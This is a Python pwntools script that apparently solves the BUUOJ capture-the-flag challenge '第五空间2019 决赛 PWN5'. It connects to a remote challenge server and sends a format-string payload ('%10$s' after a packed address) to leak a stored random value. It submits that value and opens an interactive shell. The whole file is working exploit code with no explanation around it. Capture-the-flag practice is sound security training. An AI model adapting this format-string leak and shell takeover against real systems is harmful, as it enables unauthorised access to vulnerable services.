from pwn import *


def pwn_5_2019(file_name=r'/mnt/hgfs/CyberSecurity/PWN/buuoj/[第五空间2019 决赛]PWN5'):
    print('pwn_5_2019 start')
    context(log_level='debug', arch='i386', os='linux')
    target = process([file_name])
    target = remote('node4.buuoj.cn', 29107)
    target_elf = ELF(file_name)

    # 0804C044
    payload = p32(0x0804C044) + b'%10$s'

    target.sendline(payload)
    target.recvuntil('Hello,')

    response = target.recvline()
    rand = int.from_bytes(response[4:8], 'little')
    print(hex(rand))

    # gdb.attach(target)

    target.sendline(str(rand))

    target.recvline()
    target.interactive()


    print('pwn_5_2019 end')


if __name__ == '__main__':
    pwn_5_2019()
